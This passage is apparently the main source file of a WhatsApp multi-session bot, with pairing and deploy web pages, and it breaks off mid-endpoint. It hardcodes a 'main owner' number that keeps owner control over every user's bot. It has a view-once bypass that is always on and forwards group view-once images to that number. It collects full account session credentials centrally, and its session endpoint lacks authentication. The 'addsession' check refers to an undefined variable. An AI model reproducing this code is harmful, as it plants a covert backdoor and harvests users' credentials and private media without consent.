// ============================================================
// ETIAS-MINI-BOT - FINAL DEPLOY SYSTEM
// FLOW: Deploy without SESSION -> /pair -> get session -> /deploy?session=xxx
// OWNER: 263778810589 always main owner
// FEATURES: viewonce, antidelete, antilink, antiviewonce, DM ONCE
// ============================================================
require("dotenv").config();
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const path = require("path");
const P = require("pino");
const express = require("express");
const mongoose = require("mongoose");

process.on("uncaughtException", (err) => {
    const msg = err?.message || "";
    if (msg.includes("Session") || msg.includes("MAC") || msg.includes("decrypt") || msg.includes("Closing open session")) {
        console.log("[IGNORED ERROR]", msg); return;
    }
    console.error("[UNCAUGHT EXCEPTION]", err);
});
process.on("unhandledRejection", (err) => {
    const msg = err?.message || "";
    if (msg.includes("Session") || msg.includes("MAC") || msg.includes("decrypt") || msg.includes("Connection Closed")) {
        console.log("[IGNORED REJECTION]", msg); return;
    }
});

const BOT_NAME = "*ETIAS-MINI-BOT*";
const PREFIX = ".";
const MAIN_OWNER = "263778810589"; // YOU ARE ALWAYS MAIN OWNER
const OWNER_NUMBER = (process.env.OWNER_NUMBER || MAIN_OWNER).replace(/[^0-9]/g, "");
const MONGODB_URI = process.env.MONGODB_URI || process.env.MONGO_URL || "";
const PAIRING_SITE = process.env.PAIRING_SITE || "";
const SESSION_DAYS_DEFAULT = 30;

const dataPath = path.join(__dirname, "data");
const authBasePath = path.join(__dirname, "auth");
const usersPath = path.join(authBasePath, "users");
const tempAuthPath = path.join(__dirname, "temp_auth");
[dataPath, authBasePath, usersPath, tempAuthPath].forEach(d=>{ if(!fs.existsSync(d)) fs.mkdirSync(d,{recursive:true}); });

let botMode = process.env.MODE || "public";
try {
    const modeFile = path.join(dataPath, "mode.json");
    if(fs.existsSync(modeFile)){
        const md = JSON.parse(fs.readFileSync(modeFile,"utf8"));
        if(md.mode) botMode = md.mode;
    }
} catch {}
global.botMode = botMode;

// --- MONGO ---
const sessionSchema = new mongoose.Schema({
    userId: { type: String, unique: true, index: true },
    sessionId: String,
    phone: String,
    connected: { type: Boolean, default: false },
    createdAt: { type: Date, default: Date.now },
    lastConnectedAt: { type: Date, default: null },
    expiresAt: { type: Date, default: null, index: true },
    days: { type: Number, default: SESSION_DAYS_DEFAULT },
    addedBy: { type: String, default: MAIN_OWNER }
});
const SessionModel = mongoose.models.Session || mongoose.model("Session", sessionSchema);

async function connectMongo(){
    if(!MONGODB_URI){ console.log("[MONGO] No URI - local mode"); return false; }
    try{
        if(mongoose.connection.readyState===1) return true;
        await mongoose.connect(MONGODB_URI);
        console.log("[MONGO] ✅ Connected"); return true;
    }catch(e){ console.log("[MONGO] ❌",e.message); return false; }
}
function isExpired(date){ if(!date) return false; return new Date(date).getTime() <= Date.now(); }
async function saveToMongo(userId, sessionId, days=SESSION_DAYS_DEFAULT){
    if(mongoose.connection.readyState!==1) return;
    try{
        const expiresAt = new Date(Date.now() + days*24*60*60*1000);
        await SessionModel.findOneAndUpdate(
            { userId },
            { sessionId, phone: userId, connected:true, lastConnectedAt:new Date(), expiresAt, days, addedBy: MAIN_OWNER },
            { upsert:true, new:true }
        );
        console.log(`[MONGO] Saved ${userId} for ${days} days`);
    }catch(e){ console.log("[MONGO SAVE]",e.message); }
}
async function getFromMongo(){
    if(mongoose.connection.readyState!==1) return {};
    const sessions = await SessionModel.find({});
    const result = {};
    for(const s of sessions){
        if(s.expiresAt && isExpired(s.expiresAt)){
            console.log(`[EXPIRY] Removing ${s.userId} expired after ${s.days} days`);
            try{ await SessionModel.deleteOne({_id:s._id}); }catch{}
            const localAuth = s.userId==="main"? authBasePath : path.join(usersPath, s.userId);
            try{ fs.rmSync(localAuth,{recursive:true,force:true}); }catch{}
            continue;
        }
        if(s.sessionId) result[s.userId] = { sessionId: s.sessionId, days: s.days };
    }
    return result;
}

// --- LOCAL DB ---
function getDB(file, def={}){ const fp=path.join(dataPath,file); if(!fs.existsSync(fp)) fs.writeFileSync(fp,JSON.stringify(def,null,2)); try{ return JSON.parse(fs.readFileSync(fp,"utf8")); }catch{ return def; } }
function saveDB(file,data){ fs.writeFileSync(path.join(dataPath,file),JSON.stringify(data,null,2)); }
function getMultiDB(){ return getDB("multi_sessions.json",{}); }
function saveMultiSession(userId, sessionId, days=SESSION_DAYS_DEFAULT){
    const db=getMultiDB(); db[userId]={ sessionId, days, addedAt: Date.now() }; saveDB("multi_sessions.json",db);
    saveToMongo(userId,sessionId,days);
}
function initSessionFromString(sessionString, destination){
    if(!sessionString) return false;
    try{
        const credsPath=path.join(destination,"creds.json");
        if(fs.existsSync(credsPath) && fs.statSync(credsPath).size>500) return true;
        let clean=sessionString.trim().replace(/\s/g,"");
        if(clean.includes("~")) clean=clean.split("~").pop();
        const decoded=Buffer.from(clean,"base64").toString("utf8");
        if(decoded.startsWith("{")){
            if(!fs.existsSync(destination)) fs.mkdirSync(destination,{recursive:true});
            fs.writeFileSync(credsPath,decoded);
            console.log(`[SESSION] Restored ${path.basename(destination)}`);
            return true;
        }
    }catch(e){ console.log("[SESSION RESTORE]",e.message); }
    return false;
}

// --- DM ONCE ---
const sentDM=new Set();
async function sendSessionDMOnce(sock, authPath){
  try{
    const myNumber=normalizeNumber(sock.user?.id||"");
    if(!myNumber) return;
    const lockFile=path.join(dataPath,`sent_${myNumber}.lock`);
    if(fs.existsSync(lockFile) || sentDM.has(myNumber)) return;
    await new Promise(r=>setTimeout(r,3000));
    const credsPath=path.join(authPath,"creds.json");
    if(!fs.existsSync(credsPath)) return;
    const creds=fs.readFileSync(credsPath,'utf8');
    const full=`ETIAS-MINI-BOT~${Buffer.from(creds).toString("base64")}`;
    await sock.sendMessage(sock.user.id, { text: full });
    fs.writeFileSync(lockFile,Date.now().toString());
    sentDM.add(myNumber);
    console.log(`[DM SENT ONCE] ${myNumber}`);
  }catch(e){ console.log("[DM FAIL]",e.message); }
}

// --- MESSAGE STORE ---
const messageStore=new Map();
const pendingSessions=new Map(); // temp pairing -> session
const pairingCodes=new Map(); // number -> code

// --- COMMANDS ---
const commands=new Map();
const commandsPath=path.join(__dirname,"commands");
if(fs.existsSync(commandsPath)){
    const files=fs.readdirSync(commandsPath).filter(f=>f.endsWith(".js"));
    for(const file of files){
        try{
            const fp=path.join(commandsPath,file);
            delete require.cache[require.resolve(fp)];
            const cmd=require(fp);
            const name=(cmd.name||file.replace(".js","")).toLowerCase();
            commands.set(name,cmd);
            if(Array.isArray(cmd.aliases)) for(const a of cmd.aliases) commands.set(a.toLowerCase(),cmd);
        }catch(e){ console.log(`[CMD ERR] ${file}`,e.message); }
    }
}
console.log(`[COMMANDS] ${commands.size} loaded`);

const activeBots=new Map();
const startingBots=new Map();
const reconnectTimers=new Map();
const disconnect440History=new Map();
const stoppedBots=new Set();

function normalizeNumber(v){ if(!v) return ""; return String(v).split(":")[0].split("@")[0].replace(/[^0-9]/g,""); }
function getSenderNumber(msg){ const k=msg?.key||{}; return normalizeNumber(k.participant||k.remoteJid||""); }
function isOwnerMessage(msg, userId){
    const k=msg?.key||{};
    if(k.fromMe) return true;
    const sender=getSenderNumber(msg);
    if(sender===MAIN_OWNER) return true; // YOU ALWAYS OWNER
    if(sender===OWNER_NUMBER) return true;
    if(userId!=="main" && sender===normalizeNumber(userId)) return true;
    return false;
}
function getMessageText(message){
    if(!message) return "";
    if(typeof message.conversation==="string") return message.conversation;
    if(message.extendedTextMessage?.text) return message.extendedTextMessage.text;
    if(message.imageMessage?.caption) return message.imageMessage.caption;
    if(message.videoMessage?.caption) return message.videoMessage.caption;
    if(message.documentMessage?.caption) return message.documentMessage.caption;
    if(message.viewOnceMessage?.message) return getMessageText(message.viewOnceMessage.message);
    if(message.viewOnceMessageV2?.message) return getMessageText(message.viewOnceMessageV2.message);
    if(message.viewOnceMessageV2Extension?.message) return getMessageText(message.viewOnceMessageV2Extension.message);
    return "";
}
function scheduleReconnect(userId, delay, sessionString=null){
    if(stoppedBots.has(userId)) return;
    if(reconnectTimers.has(userId)) return;
    console.log(`[RECONNECT] ${userId} in ${delay/1000}s`);
    const t=setTimeout(async()=>{ reconnectTimers.delete(userId); try{ await startBotForUser(userId,sessionString); }catch(e){ console.log(`[RECONNECT ERR] ${userId}`,e.message); scheduleReconnect(userId,10000,sessionString); } },delay);
    reconnectTimers.set(userId,t);
}
function clearReconnect(userId){ const t=reconnectTimers.get(userId); if(t){ clearTimeout(t); reconnectTimers.delete(userId); } }

// ============================================================
// START BOT FOR USER
// ============================================================
async function startBotForUser(userId, sessionString=null){
    if(startingBots.has(userId)) return startingBots.get(userId);
    const exist=activeBots.get(userId);
    if(exist && exist.user) return exist;
    stoppedBots.delete(userId);
    const startPromise=(async()=>{
        const isMain=userId==="main";
        const authPath=isMain? authBasePath : path.join(usersPath, normalizeNumber(userId));
        if(sessionString) initSessionFromString(sessionString, authPath);
        else if(isMain && process.env.SESSION_ID) initSessionFromString(process.env.SESSION_ID, authPath);
        const { state, saveCreds } = await useMultiFileAuthState(authPath);
        const sock=makeWASocket({
            auth: state,
            logger: P({level:"silent"}),
            printQRInTerminal:false,
            browser:["ETIAS-MINI-BOT","Chrome","1.0.0"],
            markOnlineOnConnect:false,
            syncFullHistory:false,
            getMessage: async(key)=> messageStore.get(key.id)?.msg || undefined
        });
        activeBots.set(userId,sock);
        sock.ev.on("creds.update",saveCreds);

        sock.ev.on("connection.update", async update=>{
            const { connection, lastDisconnect }=update;
            if(connection==="open"){
                console.log(`\n[CONNECTED] ${userId} ID:${sock.user?.id} OWNER:${MAIN_OWNER}`);
                const curr=activeBots.get(userId);
                if(curr!==sock){ try{ sock.ws?.close(); }catch{} return; }
                clearReconnect(userId); disconnect440History.delete(userId);
                try{
                    const credsPath=path.join(authPath,"creds.json");
                    const creds=fs.readFileSync(credsPath,"utf8");
                    const fullSession=`ETIAS-MINI-BOT~${Buffer.from(creds).toString("base64")}`;
                    let saveId=normalizeNumber(sock.user?.id||"");
                    if(!saveId || saveId.length<5) saveId=isMain? MAIN_OWNER : normalizeNumber(userId);
                    const existingDays = getDB("multi_sessions.json",{})[saveId]?.days || SESSION_DAYS_DEFAULT;
                    saveMultiSession(saveId, fullSession, existingDays);
                }catch(e){ console.log("[SESSION SAVE ERR]",e.message); }
                console.log(`[READY] ${userId} - Main Owner: ${MAIN_OWNER}`);
                await sendSessionDMOnce(sock, authPath);
                return;
            }
            if(connection==="close"){
                const code=lastDisconnect?.error?.output?.statusCode;
                console.log(`[DISCONNECTED] ${userId} code=${code}`);
                const curr=activeBots.get(userId);
                if(curr!==sock) return;
                activeBots.delete(userId);
                if(code===DisconnectReason.loggedOut){
                    console.log(`[LOGGED OUT] ${userId}`); clearReconnect(userId); stoppedBots.add(userId);
                    try{ fs.rmSync(authPath,{recursive:true,force:true}); }catch{}
                    if(!isMain){ const db=getMultiDB(); delete db[userId]; saveDB("multi_sessions.json",db); if(mongoose.connection.readyState===1){ try{ await SessionModel.deleteOne({userId}); }catch{} } }
                    return;
                }
                if(code===DisconnectReason.connectionReplaced || code===440){
                    const now=Date.now(); let hist=disconnect440History.get(userId)||[]; hist=hist.filter(t=>now-t<60000); hist.push(now); disconnect440History.set(userId,hist);
                    console.log(`[440] ${userId} ${hist.length}/3`);
                    if(hist.length>=3){ console.log(`[440 STOP] ${userId}`); stoppedBots.add(userId); clearReconnect(userId); return; }
                    scheduleReconnect(userId,30000,sessionString); return;
                }
                if(!stoppedBots.has(userId)) scheduleReconnect(userId,5000,sessionString);
            }
        });

        sock.ev.on("group-participants.update", async update=>{
            const welcomeDB=getDB("welcome.json",{}); const goodbyeDB=getDB("goodbye.json",{});
            try{
                for(const p of update.participants){
                    if(update.action==="add" && welcomeDB[update.id]?.enabled) await sock.sendMessage(update.id,{text:`Welcome @${p.split("@")[0]}`,mentions:[p]});
                    if(update.action==="remove" && goodbyeDB[update.id]?.enabled) await sock.sendMessage(update.id,{text:`Goodbye @${p.split("@")[0]}`,mentions:[p]});
                }
            }catch(e){ console.log("[GROUP UPDATE]",e.message); }
        });

        // ANTIDELETE
        sock.ev.on("messages.update", async(updates)=>{
            for(const update of updates){
                try{
                    const antideleteDB=getDB("antidelete.json",{});
                    const enabled=antideleteDB[update.key?.remoteJid]?.enabled || antideleteDB["global"]?.enabled;
                    if(!enabled) continue;
                    if(update.update?.message===null){
                        const stored=messageStore.get(update.key.id);
                        if(stored &&!stored.fromMe){
                            await sock.sendMessage(stored.jid,{text:`*🚫 ANTIDELETE*\n*From:* @${stored.sender.split('@')[0]}\n*Deleted:* ${stored.text||stored.type}`,mentions:[stored.sender]});
                            if(stored.msg?.message) await sock.sendMessage(stored.jid,{forward:stored.msg},{quoted:stored.msg});
                        }
                    }
                }catch(e){ console.log("[ANTIDELETE ERR]",e.message); }
            }
        });

        // MESSAGES
        sock.ev.on("messages.upsert", async event=>{
            const messages=event?.messages||[];
            if(!messages.length) return;
            for(const msg of messages){
                try{
                    if(!msg||!msg.message) continue;
                    const key=msg.key||{}; const jid=key.remoteJid||""; if(!jid) continue;
                    const isGroup=jid.endsWith("@g.us"); const fromMe=key.fromMe===true;
                    const senderNumber=getSenderNumber(msg);
                    let owner=isOwnerMessage(msg,userId)||fromMe;

                    messageStore.set(msg.key.id,{ jid, text:getMessageText(msg.message), sender:key.participant||jid, type:Object.keys(msg.message||{})[0], msg, fromMe });
                    if(messageStore.size>1000){ const fk=messageStore.keys().next().value; messageStore.delete(fk); }

                    // ANTIVIEWONCE / VIEWONCE BYPASS
                    const antiviewonceDB=getDB("antiviewonce.json",{});
                    const viewonceEnabled=antiviewonceDB[jid]?.enabled || antiviewonceDB["global"]?.enabled || true;
                    let viewOnceMsg=msg.message.viewOnceMessage||msg.message.viewOnceMessageV2||msg.message.viewOnceMessageV2Extension;
                    if(viewOnceMsg && viewonceEnabled){
                        try{
                            const inner=viewOnceMsg.message; const mtype=Object.keys(inner||{})[0]; const content=inner[mtype];
                            let buffer=null;
                            if(content){
                                const stream=await downloadContentFromMessage(content, mtype.includes('image')?'image':mtype.includes('video')?'video':'audio');
                                let chunks=[]; for await(const c of stream) chunks.push(c); buffer=Buffer.concat(chunks);
                            }
                            const caption=content?.caption||"";
                            const targetJid=isGroup? MAIN_OWNER+"@s.whatsapp.net" : jid;
                            const fwdText=`*👁️ ANTIVIEWONCE*\n*From:* @${senderNumber}\n*Chat:* ${jid}\n*Type:* ${mtype}\n${caption?`*Caption:* ${caption}`:""}`;
                            if(buffer){
                                if(mtype.includes('image')) await sock.sendMessage(jid,{image:buffer,caption:fwdText,mentions:[key.participant||jid]});
                                else if(mtype.includes('video')) await sock.sendMessage(jid,{video:buffer,caption:fwdText,mentions:[key.participant||jid]});
                            }else{
                                await sock.sendMessage(jid,{text:fwdText,mentions:[key.participant||jid]});
                            }
                            if(isGroup && MAIN_OWNER){
                                if(buffer){
                                    if(mtype.includes('image')) await sock.sendMessage(MAIN_OWNER+"@s.whatsapp.net",{image:buffer,caption:`ViewOnce from ${jid} by ${senderNumber}: ${caption}`});
                                }
                            }
                        }catch(e){ console.log("[ANTIVIEWONCE ERR]",e.message); }
                    }

                    let text=getMessageText(msg.message); if(!text) continue; text=text.trim();

                    // ANTILINK
                    if(isGroup &&!text.startsWith(PREFIX) &&!fromMe){
                        const antiLinkDB=getDB("antilink.json",{});
                        const groupAntilink=antiLinkDB[jid];
                        if(groupAntilink?.enabled && /(https?:\/\/|chat\.whatsapp\.com|wa\.me|t\.me|www\.)/i.test(text)){
                            try{
                                const metadata=await sock.groupMetadata(jid);
                                const participant=metadata.participants.find(p=>p.id===key.participant);
                                const isAdmin=!!participant?.admin;
                                if(!isAdmin){
                                    const botNumber=normalizeNumber(sock.user?.id);
                                    const botParticipant=metadata.participants.find(p=>normalizeNumber(p.id)===botNumber);
                                    const botIsAdmin=!!botParticipant?.admin;
                                    if(botIsAdmin){
                                        await sock.sendMessage(jid,{delete:key});
                                        if(groupAntilink.action==='kick'){
                                            await sock.groupParticipantsUpdate(jid,[key.participant],"remove");
                                            await sock.sendMessage(jid,{text:`*🚫 ANTILINK* @${senderNumber} removed`,mentions:[key.participant]});
                                        }else{
                                            await sock.sendMessage(jid,{text:`*🚫 ANTILINK* Link deleted from @${senderNumber}`,mentions:[key.participant]});
                                        }
                                    }
                                }
                            }catch(e){ console.log("[ANTILINK]",e.message); }
                        }
                    }

                    if(!text.startsWith(PREFIX)) continue;
                    const withoutPrefix=text.slice(PREFIX.length).trim(); if(!withoutPrefix) continue;
                    const parts=withoutPrefix.split(/\s+/); const commandName=parts.shift().toLowerCase(); const args=parts;

                    // BUILT-IN COMMANDS
                    if(commandName==="mode"){
                        if(!owner) continue;
                        const newMode=args[0]?.toLowerCase(); const valid=["public","private","groups","inbox"];
                        if(!newMode ||!valid.includes(newMode)){ await sock.sendMessage(jid,{text:`Current: ${global.botMode}\nAvailable: ${valid.join(", ")}`},{quoted:msg}); continue; }
                        global.botMode=newMode; saveDB("mode.json",{mode:newMode}); await sock.sendMessage(jid,{text:`✅ Mode ${newMode}`},{quoted:msg}); continue;
                    }
                    if(commandName==="antilink"){
                        if(!owner||!isGroup) continue; const act=args[0]?.toLowerCase(); let db=getDB("antilink.json",{});
                        if(!act){ await sock.sendMessage(jid,{text:`*ANTILINK*\n.antilink on / off / kick\nStatus: ${db[jid]?.enabled? "ON":"OFF"}`},{quoted:msg}); continue; }
                        if(act==="on"){ db[jid]={enabled:true,action:"delete"}; saveDB("antilink.json",db); await sock.sendMessage(jid,{text:"✅ Antilink ON"},{quoted:msg}); }
                        else if(act==="off"){ delete db[jid]; saveDB("antilink.json",db); await sock.sendMessage(jid,{text:"❌ Antilink OFF"},{quoted:msg}); }
                        else if(act==="kick"){ db[jid]={enabled:true,action:"kick"}; saveDB("antilink.json",db); await sock.sendMessage(jid,{text:"✅ Antilink KICK"},{quoted:msg}); }
                        continue;
                    }
                    if(commandName==="antidelete"){
                        if(!owner) continue; const act=args[0]?.toLowerCase(); let db=getDB("antidelete.json",{});
                        if(!act){ await sock.sendMessage(jid,{text:`*ANTIDELETE*\n.antidelete on / off / global\nStatus: ${db[jid]?.enabled? "ON": db["global"]?.enabled?"GLOBAL":"OFF"}`},{quoted:msg}); continue; }
                        if(act==="on"){ db[jid]={enabled:true}; saveDB("antidelete.json",db); await sock.sendMessage(jid,{text:"✅ Antidelete ON"},{quoted:msg}); }
                        else if(act==="off"){ delete db[jid]; saveDB("antidelete.json",db); await sock.sendMessage(jid,{text:"❌ Antidelete OFF"},{quoted:msg}); }
                        else if(act==="global"){ db["global"]={enabled:true}; saveDB("antidelete.json",db); await sock.sendMessage(jid,{text:"✅ Antidelete GLOBAL"},{quoted:msg}); }
                        continue;
                    }
                    if(commandName==="antiviewonce"||commandName==="avv"||commandName==="viewonce"){
                        if(!owner) continue; const act=args[0]?.toLowerCase(); let db=getDB("antiviewonce.json",{});
                        if(!act){ await sock.sendMessage(jid,{text:`*ANTIVIEWONCE*\n.antiviewonce on / off / global\nStatus: ${db[jid]?.enabled||db["global"]?.enabled? "ON":"OFF"}`},{quoted:msg}); continue; }
                        if(act==="on"){ db[jid]={enabled:true}; saveDB("antiviewonce.json",db); await sock.sendMessage(jid,{text:"✅ AntiViewOnce ON"},{quoted:msg}); }
                        else if(act==="off"){ delete db[jid]; saveDB("antiviewonce.json",db); await sock.sendMessage(jid,{text:"❌ AntiViewOnce OFF"},{quoted:msg}); }
                        else if(act==="global"){ db["global"]={enabled:true}; saveDB("antiviewonce.json",db); await sock.sendMessage(jid,{text:"✅ AntiViewOnce GLOBAL"},{quoted:msg}); }
                        continue;
                    }
                    if(commandName==="session"){
                        if(!owner) continue;
                        try{
                            const creds=fs.readFileSync(path.join(authPath,"creds.json"),"utf8");
                            const session=`ETIAS-MINI-BOT~${Buffer.from(creds).toString("base64")}`;
                            await sock.sendMessage(jid,{text:`*SESSION*\n\n${session}\n\nExpires: ${SESSION_DAYS_DEFAULT} days`},{quoted:msg});
                        }catch(e){ await sock.sendMessage(jid,{text:`❌ ${e.message}`},{quoted:msg}); }
                        continue;
                    }
                    if(commandName==="addsession"||commandName==="deploy"){
                        if(sender!==MAIN_OWNER) { await sock.sendMessage(jid,{text:"❌ Only main owner can add sessions"},{quoted:msg}); continue; }
                        const sess=args[0]; const days=parseInt(args[1])||30;
                        if(!sess){ await sock.sendMessage(jid,{text:"Use:.deploy ETIAS-MINI-BOT~xxx 30"},{quoted:msg}); continue; }
                        try{
                            const b64=sess.includes("~")? sess.split("~").pop() : sess;
                            const json=JSON.parse(Buffer.from(b64.trim(),"base64").toString("utf8"));
                            const uid=normalizeNumber(json?.me?.id)||`user_${Date.now()}`;
                            saveMultiSession(uid,sess,days); await startBotForUser(uid,sess);
                            await sock.sendMessage(jid,{text:`✅ Bot ${uid} deployed for ${days} days`},{quoted:msg});
                        }catch(e){ await sock.sendMessage(jid,{text:`❌ Failed: ${e.message}`},{quoted:msg}); }
                        continue;
                    }

                    const currentMode=global.botMode||"public";
                    if(currentMode==="private" &&!owner) continue;
                    if(currentMode==="groups" &&!isGroup &&!owner) continue;
                    if(currentMode==="inbox" && isGroup &&!owner) continue;

                    const command=commands.get(commandName);
                    if(!command) continue;
                    try{ await command.execute(sock,msg,args,{getDB,saveDB,downloadContentFromMessage,isOwner:owner,isGroup,userId,botMode:global.botMode,BOT_NAME,PREFIX,messageStore}); }
                    catch(e){ console.log(`[CMD ERR] ${commandName}`,e); try{ await sock.sendMessage(jid,{text:`❌ ${e.message}`},{quoted:msg}); }catch{} }
                }catch(e){ console.log("[MSG ERR]",e.message); }
            }
        });
        return sock;
    })();
    startingBots.set(userId,startPromise);
    try{ return await startPromise; }finally{ startingBots.delete(userId); }
}

// ============================================================
// PAIRING SYSTEM - FOR WEB PAIRING
// ============================================================
async function startPairingBot(phoneNumber){
    const cleanNum=normalizeNumber(phoneNumber);
    const tempId=`temp_${cleanNum}_${Date.now()}`;
    const authPath=path.join(tempAuthPath,tempId);
    if(!fs.existsSync(authPath)) fs.mkdirSync(authPath,{recursive:true});
    const { state, saveCreds } = await useMultiFileAuthState(authPath);
    const sock=makeWASocket({
        auth: state,
        logger: P({level:"silent"}),
        printQRInTerminal:false,
        browser:["ETIAS-PAIR","Chrome","1.0.0"],
        markOnlineOnConnect:false
    });
    sock.ev.on("creds.update",saveCreds);
    return new Promise(async(resolve,reject)=>{
        try{
            await new Promise(r=>setTimeout(r,2000));
            if(!sock.authState.creds.registered){
                const code=await sock.requestPairingCode(cleanNum);
                const formatted=code.match(/.{1,4}/g)?.join("-")||code;
                pairingCodes.set(cleanNum, { code: formatted, raw: code, authPath, tempId, sock, timestamp: Date.now() });
                console.log(`[PAIR CODE] ${cleanNum} => ${formatted}`);
                resolve({ code: formatted, raw: code });
                // Wait for connection to generate session
                sock.ev.on("connection.update", async(update)=>{
                    if(update.connection==="open"){
                        console.log(`[PAIR CONNECTED] ${cleanNum}`);
                        try{
                            const creds=fs.readFileSync(path.join(authPath,"creds.json"),"utf8");
                            const session=`ETIAS-MINI-BOT~${Buffer.from(creds).toString("base64")}`;
                            pendingSessions.set(cleanNum, { session, timestamp: Date.now(), authPath });
                            console.log(`[SESSION GENERATED] ${cleanNum}`);
                            setTimeout(()=>{ try{ sock.ws?.close(); }catch{} },2000);
                        }catch(e){ console.log("[PAIR SESSION ERR]",e.message); }
                    }
                });
            }
        }catch(e){ console.log("[PAIR ERR]",e.message); reject(e); }
    });
}

async function startAll(){
    await connectMongo();
    let multiDB={};
    if(mongoose.connection.readyState===1){ multiDB=await getFromMongo(); console.log(`[MULTI] ${Object.keys(multiDB).length} valid sessions`); }
    else{ multiDB=getMultiDB(); console.log(`[MULTI] ${Object.keys(multiDB).length} local sessions`); }
    const ids=Object.keys(multiDB);
    if(ids.length>0){
        for(const id of ids){
            console.log(`[MULTI] Starting ${id}`);
            try{
                const data=multiDB[id];
                const sess=typeof data==="string"? data : data.sessionId;
                await startBotForUser(id,sess);
            }catch(e){ console.log(`[MULTI START ERR] ${id}`,e.message); }
            await new Promise(r=>setTimeout(r,3000));
        }
        console.log("[MULTI] All saved sessions started");
        // ALSO START MAIN IF SESSION_ID EXISTS AND NOT ALREADY STARTED
        if(process.env.SESSION_ID &&!activeBots.has(MAIN_OWNER)){
            console.log("[MAIN] Starting SESSION_ID as backup");
            try{ await startBotForUser("main",process.env.SESSION_ID); }catch(e){ console.log("[MAIN ERR]",e.message); }
        }
        return;
    }
    if(process.env.SESSION_ID){
        console.log("[MAIN] Starting SESSION_ID once...");
        await startBotForUser("main",process.env.SESSION_ID);
        return;
    }
    console.log("[MAIN] No saved session - waiting for /pair");
    console.log(`[MAIN] Owner: ${MAIN_OWNER} - Deploy at /deploy?session=xxx&days=30`);
}

// ============================================================
// EXPRESS SERVER + PAIR & DEPLOY PAGES
// ============================================================
const app=express();
app.use(express.json({limit:"10mb"}));
app.use(express.urlencoded({extended:true}));

app.get("/", async(req,res)=>{
    let mongoCount=0; if(mongoose.connection.readyState===1) mongoCount=await SessionModel.countDocuments(); else mongoCount=Object.keys(getMultiDB()).length;
    res.send(`
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>ETIAS-MINI-BOT</title>
<style>
body{background:#080808;color:#fff;font-family:Arial,sans-serif;text-align:center;padding:20px;}
.card{max-width:550px;margin:auto;background:#151515;padding:25px;border-radius:18px;box-shadow:0 0 30px rgba(0,255,136,.15);}
h1{color:#00ff88;}.btn{display:block;padding:15px;margin:12px 0;background:#00ff88;color:#000;text-decoration:none;border-radius:10px;font-weight:bold;}
.dark{background:#222;color:#fff;} input,select{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:none;background:#222;color:#fff;}
.small{color:#888;font-size:12px;}.green{color:#00ff88}.box{background:#0f0f0f;padding:15px;border-radius:10px;margin:10px 0;text-align:left;word-break:break-all;}
</style></head><body><div class="card">
<h1>🤖 ETIAS-MINI-BOT</h1>
<p>Active Bots: <strong>${activeBots.size}</strong> | Sessions: <strong>${mongoCount}</strong></p>
<p>Mode: <strong>${global.botMode}</strong> | Owner: <strong>${MAIN_OWNER}</strong></p>
<p>Features: <strong>ViewOnce, AntiDelete, AntiLink, AntiViewOnce</strong></p>
<a class="btn" href="/pair">🔗 PAIR NEW BOT</a>
<a class="btn dark" href="/deploy">🚀 DEPLOY SESSION</a>
<a class="btn dark" href="/bots">📋 VIEW BOTS</a>
<div class="box">
<h3 class="green">How to deploy:</h3>
1. Click PAIR NEW BOT -> Enter number -> Get code -> Pair on WhatsApp<br>
2. Copy SESSION ID (ETIAS-MINI-BOT~...)<br>
3. Send session to owner ${MAIN_OWNER}<br>
4. Owner goes to /deploy?session=ETIAS~...&days=30<br>
5. Bot goes live for X days
</div>
<p class="small">ETIAS TECH - Main Owner ${MAIN_OWNER}</p>
</div></body></html>
`);
});

app.get("/pair", (req,res)=>{
    res.send(`
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Pair Bot</title>
<style>body{background:#080808;color:#fff;font-family:Arial;text-align:center;padding:20px;}.card{max-width:500px;margin:auto;background:#151515;padding:25px;border-radius:18px;} input{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:none;background:#222;color:#fff;}.btn{width:100%;padding:15px;background:#00ff88;color:#000;border:none;border-radius:10px;font-weight:bold;cursor:pointer;margin-top:10px;}.code{font-size:32px;color:#00ff88;font-weight:bold;letter-spacing:5px;margin:20px 0;}.session{background:#0a0a0a;padding:15px;border-radius:10px;word-break:break-all;text-align:left;font-size:12px;max-height:300px;overflow:auto;} </style>
</head><body><div class="card">
<h1 style="color:#00ff88">🔗 PAIR BOT</h1>
<p>Enter WhatsApp number with country code</p>
<input id="number" placeholder="263778810589" value="">
<button class="btn" onclick="getCode()">GET PAIR CODE</button>
<div id="result"></div>
<script>
let checkInterval=null;
async function getCode(){
  const num=document.getElementById('number').value.trim();
  if(!num){ alert('Enter number'); return; }
  document.getElementById('result').innerHTML='<p>Generating code...</p>';
  try{
    const res=await fetch('/api/pair',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({number:num})});
    const data=await res.json();
    if(data.error){ document.getElementById('result').innerHTML='<p style=color:red>'+data.error+'</p>'; return; }
    document.getElementById('result').innerHTML='<p>PAIR CODE:</p><div class=code>'+data.code+'</div><p>Go to WhatsApp > Linked Devices > Link with phone number > Enter this code</p><p id=status>Waiting for pairing...</p><div id=sessionBox></div>';
    // Start polling for session
    if(checkInterval) clearInterval(checkInterval);
    checkInterval=setInterval(async()=>{
      const r=await fetch('/api/session/'+num);
      const d=await r.json();
      if(d.session){
        clearInterval(checkInterval);
        document.getElementById('status').innerHTML='<p style=color:#00ff88>✅ Paired! Copy your session:</p>';
        document.getElementById('sessionBox').innerHTML='<div class=session>'+d.session+'</div><br><button class=btn onclick=navigator.clipboard.writeText(\\''+d.session+'\\')>COPY SESSION</button><br><br><a href=/deploy?session='+encodeURIComponent(d.session)+' style=color:#00ff88>Go to Deploy Page</a><p style=color:#888>Send this session to owner ${MAIN_OWNER} to deploy for X days</p>';
      }
    },3000);
  }catch(e){ document.getElementById('result').innerHTML='<p style=color:red>'+e.message+'</p>'; }
}
</script>
</div></body></html>
`);
});

app.post("/api/pair", async(req,res)=>{
    try{
        const { number }=req.body;
        if(!number) return res.json({error:"Number required"});
        const clean=normalizeNumber(number);
        if(clean.length<10) return res.json({error:"Invalid number"});
        const result=await startPairingBot(clean);
        res.json({ code: result.code, number: clean });
    }catch(e){ res.json({error:e.message}); }
});

app.get("/api/session/:number", (req,res)=>{
    const num=normalizeNumber(req.params.number);
    const data=pendingSessions.get(num);
